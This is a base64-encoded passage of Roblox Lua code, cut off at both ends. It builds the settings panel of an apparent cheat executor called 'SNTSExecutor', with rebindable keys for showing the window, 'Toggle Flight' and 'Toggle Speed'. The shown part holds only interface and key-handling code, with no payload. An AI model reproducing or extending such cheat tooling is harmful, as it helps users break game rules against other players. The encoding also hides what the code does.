yhbW3JieGFzc2V0Oi8vZm9udHMvZmFtaWxpZXMvR290aGFtU1NtLmpzb25dXSwgRW51bS5Gb250V2VpZ2h0LkJvbGQsIEVudW0uRm9udFN0eWxlLk5vcm1hbCk7CkcyTFsiZTUiXVsiVGV4dENvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoODYsIDg2LCA4Nik7CkcyTFsiZTUiXVsiQmFja2dyb3VuZFRyYW5zcGFyZW5jeSJdID0gMTsKRzJMWyJlNSJdWyJBbmNob3JQb2ludCJdID0gVmVjdG9yMi5uZXcoMCwgMC41KTsKRzJMWyJlNSJdWyJTaXplIl0gPSBVRGltMi5uZXcoMCwgMTI4LCAwLCA1MCk7CkcyTFsiZTUiXVsiQm9yZGVyQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKTsKRzJMWyJlNSJdWyJUZXh0Il0gPSBbW0tdXTsKRzJMWyJlNSJdWyJOYW1lIl0gPSBbW0tleWJpbmQxXV07CkcyTFsiZTUiXVsiUG9zaXRpb24iXSA9IFVEaW0yLm5ldygwLjUyNjc4LCAwLCAwLjUsIDApOwoKLS0vLyBUb2dnbGUgU05UU0V4ZWN1dG9yIHdpdGggY29uZmlndXJhYmxlIGtleWJpbmQgKGRlZmF1bHQgSykKZG8KICAgIGxvY2FsIFVzZXJJbnB1dFNlcnZpY2UgPSBnYW1lOkdldFNlcnZpY2UoIlVzZXJJbnB1dFNlcnZpY2UiKQogICAgbG9jYWwgRm91bmRhdGlvbk92ZXJsYXkgPSBHMkxbIjEiXSAtLSBTY3JlZW5HdWkgY3JlYXRlZCBlYXJsaWVyCiAgICBsb2NhbCBrZXliaW5kTGFiZWwgPSBHMkxbImU1Il0gLS0gS2V5YmluZDEgbGFiZWwKICAgIGxvY2FsIHdhaXRpbmdGb3JLZXkgPSBmYWxzZQoKICAgIC0tIEVuc3VyZSBsYWJlbCBjYW4gcmVjZWl2ZSBpbnB1dCAoVGV4dExhYmVsIHN0aWxsIHJlY2VpdmVzIElucHV0QmVnYW4pCiAgICBrZXliaW5kTGFiZWwuQWN0aXZlID0gdHJ1ZQogICAga2V5YmluZExhYmVsLlNlbGVjdGFibGUgPSB0cnVlCgogICAgLS0gTm9ybWFsaXplIGluaXRpYWwgbGFiZWwgdG8gYSBLZXlDb2RlIChkZWZhdWx0IHRvIEspCiAgICBsb2NhbCBmdW5jdGlvbiB0ZXh0VG9LZXljb2RlKG5hbWUpCiAgICAgICAgaWYgbm90IG5hbWUgb3IgbmFtZSA9PSAiIiB0aGVuIHJldHVybiBFbnVtLktleUNvZGUuSyBlbmQKICAgICAgICBuYW1lID0gdG9zdHJpbmcobmFtZSk6Z3N1YigiJXMrIiwgIiIpOnVwcGVyKCkKICAgICAgICByZXR1cm4gRW51bS5LZXlDb2RlW25hbWVdIG9yIEVudW0uS2V5Q29kZS5LCiAgICBlbmQKCiAgICBsb2NhbCB0b2dnbGVLZXkgPSB0ZXh0VG9LZXljb2RlKGtleWJpbmRMYWJlbC5UZXh0KQoKICAgIC0tIFRvZ2dsZSBmdW5jdGlvbgogICAgbG9jYWwgZnVuY3Rpb24gdG9nZ2xlR1VJKCkKICAgICAgICBpZiBGb3VuZGF0aW9uT3ZlcmxheSB0aGVuCiAgICAgICAgICAgIEZvdW5kYXRpb25PdmVybGF5LkVuYWJsZWQgPSBub3QgRm91bmRhdGlvbk92ZXJsYXkuRW5hYmxlZAogICAgICAgIGVuZAogICAgZW5kCgogICAgLS0gV2hlbiBjbGlja2luZyB0aGUgbGFiZWwsIGVudGVyICJ3YWl0aW5nIGZvciBrZXkiIG1vZGUKICAgIGtleWJpbmRMYWJlbC5JbnB1dEJlZ2FuOkNvbm5lY3QoZnVuY3Rpb24oaW5wdXQpCiAgICAgICAgaWYgaW5wdXQuVXNlcklucHV0VHlwZSA9PSBFbnVtLlVzZXJJbnB1dFR5cGUuTW91c2VCdXR0b24xIHRoZW4KICAgICAgICAgICAgd2FpdGluZ0ZvcktleSA9IHRydWUKICAgICAgICAgICAga2V5YmluZExhYmVsLlRleHQgPSAiUHJlc3MgYSBLZXkuLi4iCiAgICAgICAgICAgIGtleWJpbmRMYWJlbC5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoODYsIDg2LCA4NikKICAgICAgICBlbmQKICAgIGVuZCkKCiAgICAtLSBHbG9iYWwga2V5IGxpc3RlbmVyOiBoYW5kbGVzIGJvdGggc2V0dGluZyBuZXcga2V5IGFuZCB0b2dnbGluZwogICAgVXNlcklucHV0U2VydmljZS5JbnB1dEJlZ2FuOkNvbm5lY3QoZnVuY3Rpb24oaW5wdXQsIGdhbWVQcm9jZXNzZWQpCiAgICAgICAgaWYgZ2FtZVByb2Nlc3NlZCB0aGVuIHJldHVybiBlbmQKCiAgICAgICAgLS0gSWYgd2UncmUgd2FpdGluZyBmb3IgYSBrZXksIGFjY2VwdCB0aGUgbmV4dCBrZXlib2FyZCBpbnB1dAogICAgICAgIGlmIHdhaXRpbmdGb3JLZXkgdGhlbgogICAgICAgICAgICBpZiBpbnB1dC5Vc2VySW5wdXRUeXBlID09IEVudW0uVXNlcklucHV0VHlwZS5LZXlib2FyZCBhbmQgaW5wdXQuS2V5Q29kZSB0aGVuCiAgICAgICAgICAgICAgICB0b2dnbGVLZXkgPSBpbnB1dC5LZXlDb2RlCiAgICAgICAgICAgICAgICBrZXliaW5kTGFiZWwuVGV4dCA9IGlucHV0LktleUNvZGUuTmFtZSBvciB0b3N0cmluZyhpbnB1dC5LZXlDb2RlKQogICAgICAgICAgICAgICAga2V5YmluZExhYmVsLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQig4NiwgODYsIDg2KQogICAgICAgICAgICAgICAgd2FpdGluZ0ZvcktleSA9IGZhbHNlCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICByZXR1cm4KICAgICAgICBlbmQKCiAgICAgICAgLS0gTm9ybWFsIHRvZ2dsZSBiZWhhdmlvcgogICAgICAgIGlmIGlucHV0LktleUNvZGUgYW5kIGlucHV0LktleUNvZGUgPT0gdG9nZ2xlS2V5IHRoZW4KICAgICAgICAgICAgdG9nZ2xlR1VJKCkKICAgICAgICBlbmQKICAgIGVuZCkKCiAgICAtLSBTYWZldHk6IGlmIGxhYmVsIHRleHQgd2FzIGNoYW5nZWQgZXh0ZXJuYWxseSwgcmVmcmVzaCB0b2dnbGVLZXkKICAgIC0tIChvcHRpb25hbDsga2VlcHMgY29uc2lzdGVuY3kgaWYgeW91IHByb2dyYW1tYXRpY2FsbHkgY2hhbmdlIHRoZSBsYWJlbCBsYXRlcikKICAgIHNwYXduKGZ1bmN0aW9uKCkKICAgICAgICB3aGlsZSB0YXNrLndhaXQoMikgZG8KICAgICAgICAgICAgaWYgbm90IHdhaXRpbmdGb3JLZXkgYW5kIGtleWJpbmRMYWJlbCBhbmQga2V5YmluZExhYmVsLlRleHQgfj0gKHRvZ2dsZUtleSBhbmQgdG9nZ2xlS2V5Lk5hbWUpIHRoZW4KICAgICAgICAgICAgICAgIHRvZ2dsZUtleSA9IHRleHRUb0tleWNvZGUoa2V5YmluZExhYmVsLlRleHQpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kKQplbmQKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLlNldHRpbmdzLlNob3J0Y3V0cy5TY3JvbGxpbmdGcmFtZS5VSUxpc3RMYXlvdXQKRzJMWyJlNiJdID0gSW5zdGFuY2UubmV3KCJVSUxpc3RMYXlvdXQiLCBHMkxbImUwIl0pOwpHMkxbImU2Il1bIkhvcml6b250YWxBbGlnbm1lbnQiXSA9IEVudW0uSG9yaXpvbnRhbEFsaWdubWVudC5DZW50ZXI7CkcyTFsiZTYiXVsiUGFkZGluZyJdID0gVURpbS5uZXcoMCwgMTUpOwpHMkxbImU2Il1bIlNvcnRPcmRlciJdID0gRW51bS5Tb3J0T3JkZXIuTGF5b3V0T3JkZXI7CgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuU2V0dGluZ3MuU2hvcnRjdXRzLlNjcm9sbGluZ0ZyYW1lLlNob3J0Y3V0MgpHMkxbImU3Il0gPSBJbnN0YW5jZS5uZXcoIkZyYW1lIiwgRzJMWyJlMCJdKTsKRzJMWyJlNyJdWyJCb3JkZXJTaXplUGl4ZWwiXSA9IDA7CkcyTFsiZTciXVsiQmFja2dyb3VuZENvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMzcsIDM3LCAzNyk7CkcyTFsiZTciXVsiU2l6ZSJdID0gVURpbTIubmV3KDAsIDI5MCwgMCwgNzUpOwpHMkxbImU3Il1bIkJvcmRlckNvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCk7CkcyTFsiZTciXVsiTmFtZSJdID0gW1tTaG9ydGN1dDJdXTsKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5TZXR0aW5ncy5TaG9ydGN1dHMuU2Nyb2xsaW5nRnJhbWUuU2hvcnRjdXQyLlVJQ29ybmVyCkcyTFsiZTgiXSA9IEluc3RhbmNlLm5ldygiVUlDb3JuZXIiLCBHMkxbImU3Il0pOwoKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5TZXR0aW5ncy5TaG9ydGN1dHMuU2Nyb2xsaW5nRnJhbWUuU2hvcnRjdXQyLkRpdmlkZXIKRzJMWyJlOSJdID0gSW5zdGFuY2UubmV3KCJGcmFtZSIsIEcyTFsiZTciXSk7CkcyTFsiZTkiXVsiQm9yZGVyU2l6ZVBpeGVsIl0gPSAwOwpHMkxbImU5Il1bIkJhY2tncm91bmRDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpOwpHMkxbImU5Il1bIkFuY2hvclBvaW50Il0gPSBWZWN0b3IyLm5ldygwLjUsIDAuNSk7CkcyTFsiZTkiXVsiU2l6ZSJdID0gVURpbTIubmV3KDAsIDEsIDAsIDMzKTsKRzJMWyJlOSJdWyJQb3NpdGlvbiJdID0gVURpbTIubmV3KDAuNSwgMCwgMC41LCAwKTsKRzJMWyJlOSJdWyJCb3JkZXJDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDAsIDAsIDApOwpHMkxbImU5Il1bIk5hbWUiXSA9IFtbRGl2aWRlcl1dOwpHMkxbImU5Il1bIkJhY2tncm91bmRUcmFuc3BhcmVuY3kiXSA9IDAuNzsKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5TZXR0aW5ncy5TaG9ydGN1dHMuU2Nyb2xsaW5nRnJhbWUuU2hvcnRjdXQyLlNob3J0Y3V0MgpHMkxbImVhIl0gPSBJbnN0YW5jZS5uZXcoIlRleHRMYWJlbCIsIEcyTFsiZTciXSk7CkcyTFsiZWEiXVsiQm9yZGVyU2l6ZVBpeGVsIl0gPSAwOwpHMkxbImVhIl1bIlRleHRTaXplIl0gPSAxNzsKRzJMWyJlYSJdWyJUZXh0WEFsaWdubWVudCJdID0gRW51bS5UZXh0WEFsaWdubWVudC5MZWZ0OwpHMkxbImVhIl1bIkJhY2tncm91bmRDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpOwpHMkxbImVhIl1bIkZvbnRGYWNlIl0gPSBGb250Lm5ldyhbW3JieGFzc2V0Oi8vZm9udHMvZmFtaWxpZXMvR290aGFtU1NtLmpzb25dXSwgRW51bS5Gb250V2VpZ2h0LkJvbGQsIEVudW0uRm9udFN0eWxlLk5vcm1hbCk7CkcyTFsiZWEiXVsiVGV4dENvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoODYsIDg2LCA4Nik7CkcyTFsiZWEiXVsiQmFja2dyb3VuZFRyYW5zcGFyZW5jeSJdID0gMTsKRzJMWyJlYSJdWyJBbmNob3JQb2ludCJdID0gVmVjdG9yMi5uZXcoMCwgMC41KTsKRzJMWyJlYSJdWyJTaXplIl0gPSBVRGltMi5uZXcoMCwgMTg1LCAwLCA1MCk7CkcyTFsiZWEiXVsiQm9yZGVyQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKTsKRzJMWyJlYSJdWyJUZXh0Il0gPSBbW1RvZ2dsZSBGbGlnaHRdXTsKRzJMWyJlYSJdWyJOYW1lIl0gPSBbW1Nob3J0Y3V0Ml1dOwpHMkxbImVhIl1bIlBvc2l0aW9uIl0gPSBVRGltMi5uZXcoMC4wNDY3OCwgMCwgMC41LCAwKTsKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5TZXR0aW5ncy5TaG9ydGN1dHMuU2Nyb2xsaW5nRnJhbWUuU2hvcnRjdXQyLktleWJpbmQyCkcyTFsiZWIiXSA9IEluc3RhbmNlLm5ldygiVGV4dExhYmVsIiwgRzJMWyJlNyJdKTsKRzJMWyJlYiJdWyJCb3JkZXJTaXplUGl4ZWwiXSA9IDA7CkcyTFsiZWIiXVsiVGV4dFNpemUiXSA9IDE3OwpHMkxbImViIl1bIkJhY2tncm91bmRDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpOwpHMkxbImViIl1bIkZvbnRGYWNlIl0gPSBGb250Lm5ldyhbW3JieGFzc2V0Oi8vZm9udHMvZmFtaWxpZXMvR290aGFtU1NtLmpzb25dXSwgRW51bS5Gb250V2VpZ2h0LkJvbGQsIEVudW0uRm9udFN0eWxlLk5vcm1hbCk7CkcyTFsiZWIiXVsiVGV4dENvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoODYsIDg2LCA4Nik7CkcyTFsiZWIiXVsiQmFja2dyb3VuZFRyYW5zcGFyZW5jeSJdID0gMTsKRzJMWyJlYiJdWyJBbmNob3JQb2ludCJdID0gVmVjdG9yMi5uZXcoMCwgMC41KTsKRzJMWyJlYiJdWyJTaXplIl0gPSBVRGltMi5uZXcoMCwgMTI4LCAwLCA1MCk7CkcyTFsiZWIiXVsiQm9yZGVyQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKTsKRzJMWyJlYiJdWyJUZXh0Il0gPSBbW0ZdXTsKRzJMWyJlYiJdWyJOYW1lIl0gPSBbW0tleWJpbmQyXV07CkcyTFsiZWIiXVsiUG9zaXRpb24iXSA9IFVEaW0yLm5ldygwLjUyNjc4LCAwLCAwLjUsIDApOwoKLS0vLyBUb2dnbGUgRmxpZ2h0ICh3aXRoIGNvbmZpZ3VyYWJsZSBrZXliaW5kLCBkZWZhdWx0IEYpCmRvCglsb2NhbCBVc2VySW5wdXRTZXJ2aWNlID0gZ2FtZTpHZXRTZXJ2aWNlKCJVc2VySW5wdXRTZXJ2aWNlIikKCWxvY2FsIFR3ZWVuU2VydmljZSA9IGdhbWU6R2V0U2VydmljZSgiVHdlZW5TZXJ2aWNlIikKCglsb2NhbCB0b2dnbGVGbGlnaHRGcmFtZSA9IEcyTFsiZTciXSAtLSBGcmFtZSBjb250YWluZXIKCWxvY2FsIHRvZ2dsZUZsaWdodExhYmVsID0gRzJMWyJlYSJdIC0tICJUb2dnbGUgRmxpZ2h0IiBsYWJlbAoJbG9jYWwgdG9nZ2xlRmxpZ2h0S2V5YmluZCA9IEcyTFsiZWIiXSAtLSBLZXliaW5kIHRleHQgbGFiZWwgKCJGIiBieSBkZWZhdWx0KQoKCWxvY2FsIHdhaXRpbmdGb3JLZXkgPSBmYWxzZQoJbG9jYWwgZmxpZ2h0RW5hYmxlZCA9IGZhbHNlCgoJLS0gQ29udmVydCB0ZXh0IHRvIEtleUNvZGUgc2FmZWx5Cglsb2NhbCBmdW5jdGlvbiB0ZXh0VG9LZXljb2RlKG5hbWUpCgkJaWYgbm90IG5hbWUgb3IgbmFtZSA9PSAiIiB0aGVuIHJldHVybiBFbnVtLktleUNvZGUuRiBlbmQKCQluYW1lID0gdG9zdHJpbmcobmFtZSk6Z3N1YigiJXMrIiwgIiIpOnVwcGVyKCkKCQlyZXR1cm4gRW51bS5LZXlDb2RlW25hbWVdIG9yIEVudW0uS2V5Q29kZS5GCgllbmQKCglsb2NhbCB0b2dnbGVLZXkgPSB0ZXh0VG9LZXljb2RlKHRvZ2dsZUZsaWdodEtleWJpbmQuVGV4dCkKCgktLSBVcGRhdGUgdGhlIGZyYW1lIGNvbG9yIGJhc2VkIG9uIGN1cnJlbnQgc3RhdGUKCWxvY2FsIGZ1bmN0aW9uIHVwZGF0ZVZpc3VhbCgpCgkJbG9jYWwgdGFyZ2V0Q29sb3IgPSBmbGlnaHRFbmFibGVkIGFuZCBDb2xvcjMuZnJvbVJHQigxMzksIDAsIDApIG9yIENvbG9yMy5mcm9tUkdCKDM3LCAzNywgMzcpCgkJVHdlZW5TZXJ2aWNlOkNyZWF0ZSh0b2dnbGVGbGlnaHRGcmFtZSwgVHdlZW5JbmZvLm5ldygwLjI1KSwge0JhY2tncm91bmRDb2xvcjMgPSB0YXJnZXRDb2xvcn0pOlBsYXkoKQoJZW5kCgoJLS0gRnVuY3Rpb24gdG8gdG9nZ2xlIGZsaWdodCBzdGF0ZQoJbG9jYWwgZnVuY3Rpb24gdG9nZ2xlRmxpZ2h0U3RhdGUoKQoJCWZsaWdodEVuYWJsZWQgPSBub3QgZmxpZ2h0RW5hYmxlZAoJCXVwZGF0ZVZpc3VhbCgpCgoJCWlmIGZsaWdodEVuYWJsZWQgdGhlbgoJCQlzdGFydEZsaWdodCgpCgkJZWxzZQoJCQlzdG9wRmxpZ2h0KCkKCQllbmQKCWVuZAoKCS0tIENsaWNraW5nIHRoZSBrZXliaW5kIGxhYmVsIGxldHMgdXNlciBjaG9vc2UgYSBuZXcga2V5Cgl0b2dnbGVGbGlnaHRLZXliaW5kLkFjdGl2ZSA9IHRydWUKCXRvZ2dsZUZsaWdodEtleWJpbmQuU2VsZWN0YWJsZSA9IHRydWUKCXRvZ2dsZUZsaWdodEtleWJpbmQuSW5wdXRCZWdhbjpDb25uZWN0KGZ1bmN0aW9uKGlucHV0KQoJCWlmIGlucHV0LlVzZXJJbnB1dFR5cGUgPT0gRW51bS5Vc2VySW5wdXRUeXBlLk1vdXNlQnV0dG9uMSB0aGVuCgkJCXdhaXRpbmdGb3JLZXkgPSB0cnVlCgkJCXRvZ2dsZUZsaWdodEtleWJpbmQuVGV4dCA9ICJQcmVzcyBhIEtleS4uLiIKCQkJdG9nZ2xlRmxpZ2h0S2V5YmluZC5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoODYsIDg2LCA4NikKCQllbmQKCWVuZCkKCgktLSBHbG9iYWwga2V5IGxpc3RlbmVyIChmb3IgcmViaW5kaW5nIGFuZCB0b2dnbGluZykKCVVzZXJJbnB1dFNlcnZpY2UuSW5wdXRCZWdhbjpDb25uZWN0KGZ1bmN0aW9uKGlucHV0LCBnYW1lUHJvY2Vzc2VkKQoJCWlmIGdhbWVQcm9jZXNzZWQgdGhlbiByZXR1cm4gZW5kCgoJCS0tIElmIHdhaXRpbmcgZm9yIGEgbmV3IGtleQoJCWlmIHdhaXRpbmdGb3JLZXkgYW5kIGlucHV0LlVzZXJJbnB1dFR5cGUgPT0gRW51bS5Vc2VySW5wdXRUeXBlLktleWJvYXJkIHRoZW4KCQkJdG9nZ2xlS2V5ID0gaW5wdXQuS2V5Q29kZQoJCQl0b2dnbGVGbGlnaHRLZXliaW5kLlRleHQgPSBpbnB1dC5LZXlDb2RlLk5hbWUgb3IgdG9zdHJpbmcoaW5wdXQuS2V5Q29kZSkKCQkJdG9nZ2xlRmxpZ2h0S2V5YmluZC5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoODYsIDg2LCA4NikKCQkJd2FpdGluZ0ZvcktleSA9IGZhbHNlCgkJCXJldHVybgoJCWVuZAoKCQktLSBOb3JtYWwgdG9nZ2xlIGJlaGF2aW9yCgkJaWYgaW5wdXQuS2V5Q29kZSBhbmQgaW5wdXQuS2V5Q29kZSA9PSB0b2dnbGVLZXkgdGhlbgoJCQl0b2dnbGVGbGlnaHRTdGF0ZSgpCgkJZW5kCgllbmQpCgoJLS0gQmFja2dyb3VuZCBjbGljayB0b2dnbGVzIGZsaWdodCB0b28KCXRvZ2dsZUZsaWdodEZyYW1lLklucHV0QmVnYW46Q29ubmVjdChmdW5jdGlvbihpbnB1dCkKCQlpZiBpbnB1dC5Vc2VySW5wdXRUeXBlID09IEVudW0uVXNlcklucHV0VHlwZS5Nb3VzZUJ1dHRvbjEgYW5kIG5vdCB3YWl0aW5nRm9yS2V5IHRoZW4KCQkJdG9nZ2xlRmxpZ2h0U3RhdGUoKQoJCWVuZAoJZW5kKQoKCS0tIFNhZmV0eSByZWZyZXNoIGV2ZXJ5IGZldyBzZWNvbmRzCgl0YXNrLnNwYXduKGZ1bmN0aW9uKCkKCQl3aGlsZSB0YXNrLndhaXQoMikgZG8KCQkJaWYgbm90IHdhaXRpbmdGb3JLZXkgYW5kIHRvZ2dsZUZsaWdodEtleWJpbmQgYW5kIHRvZ2dsZUZsaWdodEtleWJpbmQuVGV4dCB+PSAodG9nZ2xlS2V5IGFuZCB0b2dnbGVLZXkuTmFtZSkgdGhlbgoJCQkJdG9nZ2xlS2V5ID0gdGV4dFRvS2V5Y29kZSh0b2dnbGVGbGlnaHRLZXliaW5kLlRleHQpCgkJCWVuZAoJCWVuZAoJZW5kKQoKCS0tIEluaXRpYWxpemUKCXVwZGF0ZVZpc3VhbCgpCmVuZAoKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5TZXR0aW5ncy5TaG9ydGN1dHMuU2Nyb2xsaW5nRnJhbWUuU2hvcnRjdXQzCkcyTFsiZWMiXSA9IEluc3RhbmNlLm5ldygiRnJhbWUiLCBHMkxbImUwIl0pOwpHMkxbImVjIl1bIkJvcmRlclNpemVQaXhlbCJdID0gMDsKRzJMWyJlYyJdWyJCYWNrZ3JvdW5kQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigzNywgMzcsIDM3KTsKRzJMWyJlYyJdWyJTaXplIl0gPSBVRGltMi5uZXcoMCwgMjkwLCAwLCA3NSk7CkcyTFsiZWMiXVsiQm9yZGVyQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKTsKRzJMWyJlYyJdWyJOYW1lIl0gPSBbW1Nob3J0Y3V0M11dOwoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLlNldHRpbmdzLlNob3J0Y3V0cy5TY3JvbGxpbmdGcmFtZS5TaG9ydGN1dDMuVUlDb3JuZXIKRzJMWyJlZCJdID0gSW5zdGFuY2UubmV3KCJVSUNvcm5lciIsIEcyTFsiZWMiXSk7CgoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLlNldHRpbmdzLlNob3J0Y3V0cy5TY3JvbGxpbmdGcmFtZS5TaG9ydGN1dDMuRGl2aWRlcgpHMkxbImVlIl0gPSBJbnN0YW5jZS5uZXcoIkZyYW1lIiwgRzJMWyJlYyJdKTsKRzJMWyJlZSJdWyJCb3JkZXJTaXplUGl4ZWwiXSA9IDA7CkcyTFsiZWUiXVsiQmFja2dyb3VuZENvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSk7CkcyTFsiZWUiXVsiQW5jaG9yUG9pbnQiXSA9IFZlY3RvcjIubmV3KDAuNSwgMC41KTsKRzJMWyJlZSJdWyJTaXplIl0gPSBVRGltMi5uZXcoMCwgMSwgMCwgMzMpOwpHMkxbImVlIl1bIlBvc2l0aW9uIl0gPSBVRGltMi5uZXcoMC41LCAwLCAwLjUsIDApOwpHMkxbImVlIl1bIkJvcmRlckNvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCk7CkcyTFsiZWUiXVsiTmFtZSJdID0gW1tEaXZpZGVyXV07CkcyTFsiZWUiXVsiQmFja2dyb3VuZFRyYW5zcGFyZW5jeSJdID0gMC43OwoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLlNldHRpbmdzLlNob3J0Y3V0cy5TY3JvbGxpbmdGcmFtZS5TaG9ydGN1dDMuU2hvcnRjdXQzCkcyTFsiZWYiXSA9IEluc3RhbmNlLm5ldygiVGV4dExhYmVsIiwgRzJMWyJlYyJdKTsKRzJMWyJlZiJdWyJCb3JkZXJTaXplUGl4ZWwiXSA9IDA7CkcyTFsiZWYiXVsiVGV4dFNpemUiXSA9IDE3OwpHMkxbImVmIl1bIlRleHRYQWxpZ25tZW50Il0gPSBFbnVtLlRleHRYQWxpZ25tZW50LkxlZnQ7CkcyTFsiZWYiXVsiQmFja2dyb3VuZENvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSk7CkcyTFsiZWYiXVsiRm9udEZhY2UiXSA9IEZvbnQubmV3KFtbcmJ4YXNzZXQ6Ly9mb250cy9mYW1pbGllcy9Hb3RoYW1TU20uanNvbl1dLCBFbnVtLkZvbnRXZWlnaHQuQm9sZCwgRW51bS5Gb250U3R5bGUuTm9ybWFsKTsKRzJMWyJlZiJdWyJUZXh0Q29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQig4NiwgODYsIDg2KTsKRzJMWyJlZiJdWyJCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5Il0gPSAxOwpHMkxbImVmIl1bIkFuY2hvclBvaW50Il0gPSBWZWN0b3IyLm5ldygwLCAwLjUpOwpHMkxbImVmIl1bIlNpemUiXSA9IFVEaW0yLm5ldygwLCAxODUsIDAsIDUwKTsKRzJMWyJlZiJdWyJCb3JkZXJDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDAsIDAsIDApOwpHMkxbImVmIl1bIlRleHQiXSA9IFtbVG9nZ2xlIFNwZWVkXV07CkcyTFsiZWYiXVsiTmFtZSJdID0gW1tTaG9ydGN1dDNdXTsKRzJMWyJlZiJdWyJQb3NpdGlvbiJdID0gVURpbTIubmV3KDAuMDQ2NzgsIDAsIDAuNSwgMCk7CgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5TZXR0aW5ncy5TaG9ydGN1dHMuU2Nyb2xsaW5nRnJhbWUuU2hvcnRjdXQzLktleWJpbmQzCkcyTFsiZjAiXSA9IEluc3RhbmNlLm5ldygiVGV4dExhYmVsIiwgRzJMWyJlYyJdKTsKRzJMWyJmMCJdWyJCb3JkZXJTaXplUGl4ZWwiXSA9IDA7CkcyTFsiZjAiXVsiVGV4dFNpemUiXSA9IDE3OwpHMkxbImYwIl1bIkJhY2tncm91bmRDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpOwpHMkxbImYwIl1bIkZvbnRGYWNlIl0gPSBGb250Lm5ldyhbW3JieGFzc2V0Oi8vZm9udHMvZmFtaWxpZXMvR290aGFtU1NtLmpzb25dXSwgRW51bS5Gb250V2VpZ2h0LkJvbGQsIEVudW0uRm9udFN0eWxlLk5vcm1hbCk7CkcyTFsiZjAiXVsiVGV4dENvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoODYsIDg2LCA4Nik7CkcyTFsiZjAiXVsiQmFja2dyb3VuZFRyYW5zcGFyZW5jeSJdID0gMTsKRzJMWyJmMCJdWyJBbmNob3JQb2ludCJdID0gVmVjdG9yMi5uZXcoMCwgMC41KTsKRzJMWyJmMCJdWyJTaXplIl0gPSBVRGltMi5uZXcoMCwgMTI4LCAwLCA1MCk7CkcyTFsiZjAiXVsiQm9yZGVyQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKTsKRzJMWyJmMCJdWyJUZXh0Il0gPSBbW0ddXTsKRzJMWyJmMCJdWyJOYW1lIl0gPSBbW0tleWJpbmQzXV07CkcyTFsiZjAiXVsiUG9zaXRpb24iXSA9IFVEaW0yLm5ldygwLjUyNjc4LCAwLCAwLjUsIDApOwoKLS0vLyBUb2dnbGUgU3BlZWQgKHdpdGggY29uZmlndXJhYmxlIGtleWJpbmQsIGRlZmF1bHQgRykKZG8KICAgIGxvY2FsIFVzZXJJbnB1dFNlcnZpY2UgPSBnYW1lOkdldFNlcnZpY2UoIlVzZXJJbnB1dFNlcnZpY2UiKQogICAgbG9jYWwgVHdlZW5TZXJ2aWNlID0gZ2FtZTpHZXRTZXJ2aWNlKCJUd2VlblNlcnZpY2UiKQoKICAgIGxvY2FsIHRvZ2dsZVNwZWVkRnJhbWUgPSBHMkxbImVjIl0KICAgIGxvY2FsIHRvZ2dsZVNwZWVkTGFiZWwgPSBHMkxbImVmIl0KICAgIGxvY2FsIHRvZ2dsZVNwZWVkS2V5YmluZCA9IEcyTFsiZjAiXQoKICAgIGxvY2FsIHdhaXRpbmdGb3JLZXkgPSBmYWxzZQogICAgbG9jYWwgc3BlZWRFbmFibGVkID0gZmFsc2UKCiAgICBsb2NhbCBmdW5jdGlvbiB0ZXh0VG9LZXljb2RlKG5hbWUpCiAgICAgICAgaWYgbm90IG5hbWUgb3IgbmFtZSA9PSAiIiB0aGVuIHJldHVybiBFbnVtLktleUNvZGUuRyBlbmQKICAgICAgICBuYW1lID0gdG9zdHJpbmcobmFtZSk6Z3N1YigiJXMrIiwgIiIpOnVwcGVyKCkKICAgICAgICByZXR1cm4gRW51bS5LZXlDb2RlW25hbWVdIG9yIEVudW0uS2V5Q29kZS5HCiAgICBlbmQKCiAgICBsb2NhbCB0b2dnbGVLZXkgPSB0ZXh0VG9LZXljb2RlKHRvZ2dsZVNwZWVkS2V5YmluZC5UZXh0KQoKICAgIGxvY2FsIGZ1bmN0aW9uIHVwZGF0ZVZpc3VhbCgpCiAgICAgICAgbG9jYWwgdGFy